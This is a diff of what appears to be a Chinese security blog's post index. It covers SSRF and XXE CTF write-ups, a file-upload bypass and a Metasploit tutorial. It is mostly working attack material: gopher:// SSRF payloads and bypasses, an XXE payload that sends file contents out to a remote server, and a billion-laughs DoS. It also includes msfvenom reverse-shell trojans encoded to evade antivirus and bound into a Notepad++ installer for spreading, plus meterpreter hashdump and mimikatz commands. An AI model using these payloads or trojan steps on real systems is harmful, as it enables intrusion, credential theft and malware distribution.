-<p>经过一次url编码后：<code>POST%20/flag.php%20HTTP/1.1%0AHost%3A127.0.0.1%0AContent-Type%3Aapplication/x-www-form-urlencoded%0AContent-Length%3A36%0A%0Akey%3D1766811aa32af96837a1e79f776bfbd6</code><br><img src="/posts/1355767420/7.png"><br>注意：需要将<code>%0A</code>替换成<code>%0D%0A</code></p>
-<p>第二次编码后：<code>POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A127.0.0.1%250D%250AContent-Type%253Aapplication/x-www-form-urlencoded%250D%250AContent-Length%253A36%250D%250A%250D%250Akey%253D1766811aa32af96837a1e79f776bfbd6</code></p>
-<p>4、在编码后的payload前加上<code>?url=gopher://127.0.0.1:80/_</code>,在浏览器框内输入<code>?url=gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A127.0.0.1%250D%250AContent-Type%253Aapplication/x-www-form-urlencoded%250D%250AContent-Length%253A36%250D%250A%250D%250Akey%253D1766811aa32af96837a1e79f776bfbd6</code>，即可获得flag<br><img src="/posts/1355767420/8.png"><br><br></p>
-<h1 id="SSRF之绕过"><a href="#SSRF之绕过" class="headerlink" title="SSRF之绕过"></a>SSRF之绕过</h1><h2 id="URL绕过"><a href="#URL绕过" class="headerlink" title="URL绕过"></a>URL绕过</h2><figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">1.利用[::]</span><br><span class="line"><span class="link">http://</span>[<span class="string">::</span>]:80/ =&gt;http://127.0.0.1</span><br><span class="line">不加端口的话是<span class="link">http://</span>[<span class="string">::</span>]/</span><br><span class="line"></span><br><span class="line">2.利用@</span><br><span class="line">这里就是在指定的网址后加@127.0.0.1</span><br><span class="line"></span><br><span class="line">3.利用短域名</span><br><span class="line">http://dwz.cn/11SMa &gt;&gt;&gt; http://127.0.0.1</span><br><span class="line"></span><br><span class="line">4.利用句号</span><br><span class="line">127。0。0。1=&gt;127.0.0.1</span><br></pre></td></tr></table></figure>
 
-<h2 id="环回地址绕过"><a href="#环回地址绕过" class="headerlink" title="环回地址绕过"></a>环回地址绕过</h2><p>在CTF比赛中，有时会限制访问本地网站的内容，当<code>$_SEVER[&#39;REMOTE_ADDR&#39;]==&#39;127.0.0.1&#39;</code>时会报错，但是flag又需要在<code>127.0.0.1</code>才能访问，这时候我们可以对<code>127.0.0.1</code>进行变形绕过。<br><img src="/posts/1355767420/3.png"></p>
-<h2 id="302重定向绕过"><a href="#302重定向绕过" class="headerlink" title="302重定向绕过"></a>302重定向绕过</h2><p>当私网地址被过滤时，可以使用302重定向绕过。（需要一台公网服务器或者将VMware的网卡改成公网的）<br><strong>原理：</strong>当访问公网ip下的一个php文件（含重定向代码）时，php文件会重定向访问代码中的目标地址，实现绕过。</p>
-<p>php代码如下：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:http://127.0.0.1/flag.php&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="基于文件内容（文件头检测）"><a href="#基于文件内容（文件头检测）" class="headerlink" title="基于文件内容（文件头检测）"></a>基于文件内容（文件头检测）</h3><p>利用每一个特定类型的文件都会有不一样的开头或者标志位进行检测。<br><strong>常见格式</strong>：<br><img src="/posts/154257042/2.png"><br><strong>绕过方法</strong>：<br>给上传脚本加上相应的幻数头字节就可以，php引擎会将GIF89a的内容当作html文本，不解释直接跳过，后面的代码仍然能够得到执行，如下：<br>（一般不限制图片文件格式的时候使用GIF的头比较方便，因为全都是文本可打印字符。）  </p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a  </span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<br>
 
-<h2 id="DNS重绑定绕过"><a href="#DNS重绑定绕过" class="headerlink" title="DNS重绑定绕过"></a>DNS重绑定绕过</h2><p>首先要知道，针对SSRF漏洞的防御一般有以下几个：<br>1.解目标URL，获取其Host<br>2.解析Host，获取Host指向的IP地址<br>3.检查IP地址是否为内网地址<br>4.请求URL<br>5.如果有跳转，拿出跳转URL，重新执行1</p>
-<p>上面的防御可以有效限制:<br>    直接访问内网IP；<br>    302 跳转；<br>    xip.io&#x2F;xip.name；<br>    短链接变换等 URL 变形;<br>    畸形 URL;<br>    iframe 攻击;<br>    IP 进制转换;<br>针对这种防御可以使用DNS Rebinding Attack**(DNS 重绑定攻击)**</p>
-<p>SSRF防御要进行两次DNS解析，第一次DNS解析是对URL的host进行DNS解析<br>第二次DNS解析是使用CURL发包的时候进行解析。我们的突破口就是第二次的DNS解析。<br><img src="/posts/1355767420/4.png"></p>
-<h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h3><p>利用服务器两次解析同一域名的短暂间隙，更换域名背后的ip达到突破同源策略或过waf进行ssrf的目的。</p>
-<h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h3><p>1、将第一次DNS解析的IP设为合法IP，绕过host合法性检查。<br>2、将第二次DNS解析的IP设为内网IP，实现SSRF访问内网。<br>这里需要用的网站是：<a href="https://lock.cmpxchg8b.com/rebinder.html">https://lock.cmpxchg8b.com/rebinder.html</a></p>
-<p>例如CTFHUB技能树的DNS重绑定，在上面所说的网站中填写A、B的IP地址，B的随便写就行。<br><img src="/posts/1355767420/5.png"></p>
-<p>将下面生成的DNS复制，构造payload：<code>?url=7f000001.e170d501.rbndr.us/flag.php</code>，GET提交即可得到flag<br><img src="/posts/1355767420/6.png"><br><br></p>
-<h1 id="SSRF漏洞利用"><a href="#SSRF漏洞利用" class="headerlink" title="SSRF漏洞利用"></a>SSRF漏洞利用</h1><h2 id="文件上传利用（ctfhub技能树–上传文件）"><a href="#文件上传利用（ctfhub技能树–上传文件）" class="headerlink" title="文件上传利用（ctfhub技能树–上传文件）"></a>文件上传利用（ctfhub技能树–上传文件）</h2><p>1、打开网站，进入<code>?url=127.0.0.1/flag.php</code>页面，发现文件上传没有提交按钮，于是查看源码在form表单中写一个提交按钮。<br><img src="/posts/1355767420/9.png"></p>
-<p>2、随便新建一个文件，提交时使用burp suite抓包，抓取我们POST提交需要的内容<br><img src="/posts/1355767420/10.png"></p>
-<p>3、修改Host和Content-length即可，脚本如下：</p>
-<figure class="highlight ceylon"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">payload = \</span><br><span class="line"><span class="string">&quot;&quot;&quot;POST /flag.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Length: 285</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypE3OJURMLr0Wyw1s</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">------WebKitFormBoundarypE3OJURMLr0Wyw1s</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.php&quot;</span></span><br><span class="line"><span class="string">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?php?&gt;</span></span><br><span class="line"><span class="string">------WebKitFormBoundarypE3OJURMLr0Wyw1s</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;submit&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">提交</span></span><br><span class="line"><span class="string">------WebKitFormBoundarypE3OJURMLr0Wyw1s--</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">tmp = urllib.parse.quote(payload)</span><br><span class="line"><span class="keyword">new</span> = tmp.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">result = <span class="string">&#x27;gopher://127.0.0.1:80/&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+<span class="keyword">new</span></span><br><span class="line">result = urllib.parse.quote(result)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>
 
-<p>生成payload为：<code>?url=gopher%3A//127.0.0.1%3A80/_POST%2520/flag.php%2520HTTP/1.1%250D%250A%2520%2520%2520%2520Host%253A%2520127.0.0.1%250D%250A%2520%2520%2520%2520Content-Length%253A%2520292%250D%250A%2520%2520%2520%2520Content-Type%253A%2520multipart/form-data%253B%2520boundary%253D----WebKitFormBoundary1lYApMMA3NDrr2iY%250D%250A%2520%2520%2520%2520------WebKitFormBoundary1lYApMMA3NDrr2iY%250D%250A%2520%2520%2520%2520Content-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%2522test.txt%2522%250D%250A%2520%2520%2520%2520Content-Type%253A%2520text/plain%250D%250A%2520%2520%2520%2520SSRF%2520Upload%250D%250A%2520%2520%2520%2520------WebKitFormBoundary1lYApMMA3NDrr2iY%250D%250A%2520%2520%2520%2520Content-Disposition%253A%2520form-data%253B%2520name%253D%2522submit%2522%250D%250A%2520%2520%2520%2520%25E6%258F%2590%25E4%25BA%25A4%250D%250A%2520%2520%2520%2520------WebKitFormBoundary1lYApMMA3NDrr2iY--</code>，得到flag<br><img src="/posts/1355767420/11.png"></p>
-<h2 id="FastCGI协议"><a href="#FastCGI协议" class="headerlink" title="FastCGI协议"></a>FastCGI协议</h2><p>FastCGI原理：<a href="https://blog.csdn.net/mysteryflower/article/details/94386461" title="Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写">https://blog.csdn.net/mysteryflower/article/details/94386461</a></p>
 ]]></content>
       <categories>
         <category>web漏洞</category>
@@ -683,54 +688,92 @@ clearev                                                 #清除日志
       </tags>
   </entry>
   <entry>
-    <title>XXE漏洞利用</title>
-    <url>/posts/4120014032.html</url>
-    <content><![CDATA[<h2 id="XXE漏洞简述"><a href="#XXE漏洞简述" class="headerlink" title="XXE漏洞简述"></a>XXE漏洞简述</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>XXE漏洞（<strong>X</strong>ML E<strong>x</strong>ternal <strong>E</strong>ntity Injection）是一种常见的网络安全漏洞，主要发生在应用程序解析XML输入时。该漏洞的成因是应用程序没有对外部实体进行限制或过滤，导致攻击者可以注入恶意的外部实体，从而执行一系列危害性操作</p>
+    <title>Metasploit</title>
+    <url>/posts/1051313787.html</url>
+    <content><![CDATA[<h2 id="Metasploit的免杀和基本使用"><a href="#Metasploit的免杀和基本使用" class="headerlink" title="Metasploit的免杀和基本使用"></a>Metasploit的免杀和基本使用</h2><p>1、在kali里打开Metasploit，创建payload，输入<code>msfvenom -p windows/meterpreter/reverse_tcp lhost=*** lport=*** -f exe -o ***(保存的文件名字及后缀)</code></p>
 <span id="more"></span>
-<br>
-
-<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>XXE漏洞的<strong>核心原理是利用XML文档中的DTD（文档类型定义）部分来引入外部实体。</strong>攻击者通过构造特定的<strong>XML文档</strong>，包含恶意的外部实体引用，使得服务器在解析这些XML文档时，会按照这些外部实体的配置执行，从而达到读取文件、执行系统命令、内网探测等目的。</p>
-<p>所以，这里先对XML文档和XML文档中的DTD做一些解释。<br><br></p>
-<h3 id="XML文档"><a href="#XML文档" class="headerlink" title="XML文档"></a>XML文档</h3><p>XML 指可扩展标记语言（eXtensible Markup Language）。<br>XML 被设计<strong>用来传输和存储数据</strong>，不用于表现和展示数据，HTML 则用来表现数据。</p>
-<p>下面是一个简单的XML实体</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--XML声明--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--DTD--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">body</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">warning</span> <span class="string">&quot;Warning: Something bad happened... please refresh and try again.&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--文档元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">message</span>&gt;</span> <span class="symbol">&amp;warning;</span> <span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<br>
-
-<h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><p>文档类型定义（DTD）是XXE漏洞的重点利用对象，DTD用来为XML文档定义语义约束。可以嵌入在XML文档中（内部声明），也可以独立的放在一个文件中（外部引用）。</p>
-<p>DTD中一些重要的关键字包括：<br>DOCTYPE（DTD的声明）<br>ENTITY（实体的声明）<br>SYSTEM、PUBLIC（外部资源申请）  </p>
-<p>1、DTD文档声明方式区别：<br>内部文档：<br><code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></p>
-<p>外部文档：<br><code>&lt;!DOCTYPE 根元素 SYSTEM &quot;DTD文件路径&quot;&gt;</code></p>
-<p>内外部文档结合:<br><code>&lt;!DOCTYPE 根元素 SYSTEM &quot;DTD文件路径&quot; [定义内容]&gt;</code></p>
-<p>2、参数实体声明:</p>
-<figure class="highlight mojolicious"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span>&gt;</span> [</span></span><br><span class="line"><span class="language-xml">    <span class="meta">&lt;!ENTITY % b <span class="string">&quot;&lt;!ENTITY b1 &quot;</span>hello<span class="string">&quot;&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="language-perl">    %b;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">]&gt;</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">note</span>&gt;</span>&amp;b1<span class="tag">&lt;/<span class="name">note</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
-<p><strong>参数实体</strong>用<code>% name</code>申明，引用时用<code>%name;</code>，只能在DTD中申明，DTD中引用。<br><strong>其余实体</strong>直接用<code>name</code>申明，引用时用<code>&amp;name;</code>，只能在DTD中申明，可在xml文档中引用</p>
-<p>外部引用可支持http、file等协议，不同的语言支持的协议不同，但存在一些通用的协议。例如：<br><img src="/posts/4120014032/1.png"></p>
-<p>上图是默认支持协议，还可以支持其他协议，如PHP支持的扩展协议有：<br><img src="/posts/4120014032/2.png"><br><br></p>
-<h3 id="XXE漏洞的危害"><a href="#XXE漏洞的危害" class="headerlink" title="XXE漏洞的危害"></a>XXE漏洞的危害</h3><p>XXE漏洞可能导致以下严重后果：<br><strong>文件读取：</strong>攻击者可以读取服务器上的任意文件，包括配置文件、日志文件等。<br><strong>命令执行：</strong>攻击者可以执行系统命令，进行远程代码执行。<br><strong>内网渗透：</strong>攻击者可以探测内网端口，甚至攻击内网网站。<br><strong>拒绝服务攻击（DoS）：</strong>攻击者可以发起拒绝服务攻击，导致目标系统瘫痪。<br><br></p>
-<h2 id="XXE漏洞利用"><a href="#XXE漏洞利用" class="headerlink" title="XXE漏洞利用"></a>XXE漏洞利用</h2><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><p>利用file、http协议，在DTD外部引用中注入，从而获取文件内容。任意文件读取有分为<strong>有回显</strong>和<strong>无回显</strong>两种。</p>
-<h4 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h4><p>直接读取文件：</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = <span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY f <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span><span class="symbol">&amp;f;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>这里将网站中的flag.php文件以base64编码的方式取出，赋值给了实体f，<br>然后实体f的值作为元素x中的字符串数据被php解析的时候取出，作为对象里的内容，最后被打印出来。<br><br></p>
-<h4 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h4><p>没有回显的话可以把数据发送到远程服务器:<br>1.<strong>利用file等协议</strong>去读取本地文件<br>2.<strong>利用http协议</strong>带出实体  </p>
-<p>所以这里需要两个payload：</p>
-<figure class="highlight mojolicious"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="meta">&lt;?xml verstion=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span>[</span></span></span><br><span class="line"><span class="meta"><span class="language-xml">    <span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">    <span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://远程服务器ip/evil.dtd&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml"></span></span><span class="language-perl">        %dtd;</span><span class="language-xml"><span class="meta"></span></span></span><br><span class="line"><span class="meta"><span class="language-xml"></span></span><span class="language-perl">        %send;</span><span class="language-xml"><span class="meta"></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">]&gt;</span></span></span><br></pre></td></tr></table></figure>
-
-<p>远程服务器的evil.dtd文件内容（evil.dtd内部的%号要进行实体编码成&amp;#x25。）：  </p>
-<figure class="highlight mojolicious"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="meta">&lt;!ENTITY % <span class="keyword">all</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">    <span class="string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://远程服务器ip/?data=%file;&#x27;&gt;&quot;</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="language-perl">%all;</span></span><br></pre></td></tr></table></figure>
-<p><font color="red">执行流程：</font><br>1、php过滤器将flag进行base64编码后赋值给<code>%file</code>实体<br>2、解析<code>%dtd</code>时，将会访问远程服务器的<code>evil.dtd</code>文件<br>3、在<code>evil.dtd</code>内解析<code>%all</code>实体时，会将<code>%file</code>实体带入<br>4、通过访问指定的链接，将数据赋给<code>%send</code><br>5、访问接受数据的服务器中的日志信息，可以看到数据。<br><br></p>
-<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>XXE漏洞造成命令执行很少见，要求在php环境下，xml要装有expect扩展，然而该扩展默认是没有安装的,所以这里不进行讲解。</p>
-<h3 id="内网探测"><a href="#内网探测" class="headerlink" title="内网探测"></a>内网探测</h3><p>这里其实和读取文件类似，只不过文件地址变成了url</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = <span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY f <span class="keyword">SYSTEM</span> <span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span><span class="symbol">&amp;f;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="Dos攻击"><a href="#Dos攻击" class="headerlink" title="Dos攻击"></a>Dos攻击</h3><p>这个方法通过创建大量的实体引用，耗尽系统资源，导致拒绝服务.</p>
-<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="params">&lt;?xml version=&quot;<span class="number">1.0</span>&quot;?&gt;</span></span><br><span class="line"><span class="params">&lt;!DOCTYPE data [</span></span><br><span class="line"><span class="params">  &lt;!ENTITY a &quot;a&quot;&gt;</span></span><br><span class="line">  <span class="params">&lt;!ENTITY b &quot;<span class="variable">&amp;a</span>;<span class="variable">&amp;a</span>;<span class="variable">&amp;a</span>;<span class="variable">&amp;a</span>;<span class="variable">&amp;a</span>;<span class="variable">&amp;a</span>;<span class="variable">&amp;a</span>;<span class="variable">&amp;a</span>;<span class="variable">&amp;a</span>;<span class="variable">&amp;a</span>;&quot;&gt;</span></span><br><span class="line">  <span class="params">&lt;!ENTITY c &quot;<span class="variable">&amp;b</span>;<span class="variable">&amp;b</span>;<span class="variable">&amp;b</span>;<span class="variable">&amp;b</span>;<span class="variable">&amp;b</span>;<span class="variable">&amp;b</span>;<span class="variable">&amp;b</span>;<span class="variable">&amp;b</span>;<span class="variable">&amp;b</span>;<span class="variable">&amp;b</span>;&quot;&gt;</span></span><br><span class="line">  <span class="params">&lt;!ENTITY d &quot;<span class="variable">&amp;c</span>;<span class="variable">&amp;c</span>;<span class="variable">&amp;c</span>;<span class="variable">&amp;c</span>;<span class="variable">&amp;c</span>;<span class="variable">&amp;c</span>;<span class="variable">&amp;c</span>;<span class="variable">&amp;c</span>;<span class="variable">&amp;c</span>;<span class="variable">&amp;c</span>;&quot;&gt;</span></span><br><span class="line">  <span class="params">&lt;!ENTITY e &quot;<span class="variable">&amp;d</span>;<span class="variable">&amp;d</span>;<span class="variable">&amp;d</span>;<span class="variable">&amp;d</span>;<span class="variable">&amp;d</span>;<span class="variable">&amp;d</span>;<span class="variable">&amp;d</span>;<span class="variable">&amp;d</span>;<span class="variable">&amp;d</span>;<span class="variable">&amp;d</span>;&quot;&gt;</span></span><br><span class="line">  <span class="params">&lt;!ENTITY f &quot;<span class="variable">&amp;e</span>;<span class="variable">&amp;e</span>;<span class="variable">&amp;e</span>;<span class="variable">&amp;e</span>;<span class="variable">&amp;e</span>;<span class="variable">&amp;e</span>;<span class="variable">&amp;e</span>;<span class="variable">&amp;e</span>;<span class="variable">&amp;e</span>;<span class="variable">&amp;e</span>;&quot;&gt;</span></span><br><span class="line">  <span class="params">&lt;!ENTITY g &quot;<span class="variable">&amp;f</span>;<span class="variable">&amp;f</span>;<span class="variable">&amp;f</span>;<span class="variable">&amp;f</span>;<span class="variable">&amp;f</span>;<span class="variable">&amp;f</span>;<span class="variable">&amp;f</span>;<span class="variable">&amp;f</span>;<span class="variable">&amp;f</span>;<span class="variable">&amp;f</span>;&quot;&gt;</span></span><br><span class="line">  <span class="params">&lt;!ENTITY h &quot;<span class="variable">&amp;g</span>;<span class="variable">&amp;g</span>;<span class="variable">&amp;g</span>;<span class="variable">&amp;g</span>;<span class="variable">&amp;g</span>;<span class="variable">&amp;g</span>;<span class="variable">&amp;g</span>;<span class="variable">&amp;g</span>;<span class="variable">&amp;g</span>;<span class="variable">&amp;g</span>;&quot;&gt;</span></span><br><span class="line">  <span class="params">&lt;!ENTITY i &quot;<span class="variable">&amp;h</span>;<span class="variable">&amp;h</span>;<span class="variable">&amp;h</span>;<span class="variable">&amp;h</span>;<span class="variable">&amp;h</span>;<span class="variable">&amp;h</span>;<span class="variable">&amp;h</span>;<span class="variable">&amp;h</span>;<span class="variable">&amp;h</span>;<span class="variable">&amp;h</span>;&quot;&gt;</span></span><br><span class="line">  <span class="params">&lt;!ENTITY j &quot;<span class="variable">&amp;i</span>;<span class="variable">&amp;i</span>;<span class="variable">&amp;i</span>;<span class="variable">&amp;i</span>;<span class="variable">&amp;i</span>;<span class="variable">&amp;i</span>;<span class="variable">&amp;i</span>;<span class="variable">&amp;i</span>;<span class="variable">&amp;i</span>;<span class="variable">&amp;i</span>;&quot;&gt;</span></span><br><span class="line">  <span class="params">&lt;!ENTITY k &quot;<span class="variable">&amp;j</span>;<span class="variable">&amp;j</span>;<span class="variable">&amp;j</span>;<span class="variable">&amp;j</span>;<span class="variable">&amp;j</span>;<span class="variable">&amp;j</span>;<span class="variable">&amp;j</span>;<span class="variable">&amp;j</span>;<span class="variable">&amp;j</span>;<span class="variable">&amp;j</span>;&quot;&gt;</span></span><br><span class="line">]&gt;</span><br><span class="line"><span class="params">&lt;data&gt;</span><span class="variable">&amp;k</span><span class="punctuation">;</span><span class="params">&lt;/data&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/posts/1051313787/1.png"></p>
+<p><img src="/posts/1051313787/2.png"><br><br></p>
+<p>2、依次输入以下代码，以开启监听器<br><img src="/posts/1051313787/3.png"><br><br></p>
+<p>3、通过共享文件（hello.exe），主机接受文件发现windows还是会查杀，于是思考对文件进行免杀</p>
+<p>4、在kali里输入<code>msfvenom -l encoders</code>，得到编码列表。<br>注意：这里不是所有的编码方式都可以在windows系统上使用，这里我们将使用x86&#x2F;shikata_ga_nai，它是为数不多评级为excellent的编码<br>经过编码处理后的payload生成：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">//-b 特征码绕过  -i 编码次数</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.225.130 lport=8765 -e x86/shikata_ga_nai -b<span class="string">&quot;\x00&quot;</span> -i 20 -f exe -o pl3.exe</span><br></pre></td></tr></table></figure>
+<p><img src="/posts/1051313787/4.png"><br><br></p>
+<p>5、这里我们使用notepad作为木马载体，把木马捆绑在程序上，以便木马的传播<br><img src="/posts/1051313787/5.png"><br><br></p>
+<p>6、输入以下代码来将木马捆绑到notepad上：</p>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">msfvenom-<span class="selector-tag">p</span> windows/shell_reverse_tcp lhost=<span class="number">192.168</span>.<span class="number">255.130</span> lport=<span class="number">9000</span> </span><br><span class="line">-e x86/shikata_ga_nai -x npp.<span class="number">7.9</span><span class="selector-class">.Installer</span><span class="selector-class">.exe</span> -<span class="selector-tag">i</span> <span class="number">12</span> -f exe -o /home/kali/Desktop/npp<span class="selector-class">.Installer</span>.exe</span><br></pre></td></tr></table></figure>
+<p>这里解释一下其中的部分参数的含义：<br>-p：–payload，指定特定的 Payload，如果被设置为-，那么从标准输入流中读取。几乎支持全平台。 指定操作系统<br>-l：–list，列出所有可用的项目，其中值可以被设置为 payloads, encoders, nops, all<br>-n：–nopsled，指定 nop在 payload中的数量<br>-f：–format，指定 Payload的输出格式（–listformats：列出所有可用的输出格式） php exe<br>-e：–encoder，指定使用编码的encoder<br>X86&#x2F;shikata_ga_nai最流行的编码，等级为excellent；<br>解码和编码过程都是随机生成的；cmd&#x2F;powershell_base64也为excellent；<br>-a：–arch，指定目标系统架构 arm-安卓 x86 mips工业系统-路由器-交换机<br>–platform：指定目标系统平台 linus windows ios 安卓<br>-s：–space，设置未经编码的 Payload的最大长度（–encoder-space：编码后的 Payload的最大长度）<br>-b：–bad-chars，设置需要在 Payload中避免出现的字符，例如：’\0f’、’\x00’等<br>-i：–iterations，设置 Payload的编码次数<br>–smallest：尽可能生成最短的 Payload<br>-o：–out，保存 Payload到文件<br>-c：–add-code，指定一个附加的win32 shellcode文件<br>-x：–template，指定一个特定的可执行文件作为模板<br>-k：–keep，保护模板程序的功能，注入的payload作为一个新的进程运行<br>-v, –var-name，指定一个自定义的变量，以确定输出格式<br>-t, –timeout，从STDIN读取有效负载时要等待的秒数（默认为30，0 为禁用）<br>-h, –help，查看帮助选项<br>–help-formats，查看msf支持的输出格式列表  </p>
+<p><img src="/posts/1051313787/6.png"><br><br></p>
+<p>7、启动python服务共享文件，发现还是会被查杀。</p>
+<p>8、使用upx对文件进行加壳处理，但是还是不行<br><img src="/posts/1051313787/7.png"><br><br></p>
+<p>9、使用多重编码试图实现免杀，并更改编码次数，甚至更改载体软件，但是最终都以失败告终。<br><img src="/posts/1051313787/8.png"></p>
+<p><img src="/posts/1051313787/9.png"><br><br></p>
+<p>10、于是只能关闭病毒实时查杀进行接下来的实验，免杀这一部分等后面再进行补充。</p>
+<p>11、生成payload，并在本机上接受该exe<br><img src="/posts/1051313787/10.png"><br><br></p>
+<p>12、输入shell切换到目标主机window cmd shell里面，chcp 65001 防止乱码，字符编码65001 是 utf-8，输入exit即可退出shell。<br><img src="/posts/1051313787/11.png"><br><br></p>
+<p>13、从meterpreter退出到MSF框架：输入命令<code>background</code> 把我们获得的meterpreter会话挂载到后台运行。<br><img src="/posts/1051313787/12.png"><br><br></p>
+<p>14、输入session -l（字母L）可以查看所有会话，如果要进入先前的会话，输入sessions -id即可<br><img src="/posts/1051313787/13.png"><br><br></p>
+<p>15、常见命令：</p>
+<pre><code>sysinfo             									#查看目标主机系统信息
+run scraper         									#查看目标主机详细信息
+run hashdump        									#导出密码的哈希
+load kiwi           									#加载mimikatz
+ps                  									#查看目标主机进程信息
+pwd                		 							    #查看目标当前目录(windows)
+getlwd              									#查看目标当前目录(Linux)
+search -f *.jsp -d e:\                					#搜索E盘中所有以.jsp为后缀的文件
+download C:/Users/zm/Downloads/t.txt /root/          	#将目标机的C:/Users/zm/Downloads/t.txt文件下载到/root/目录下
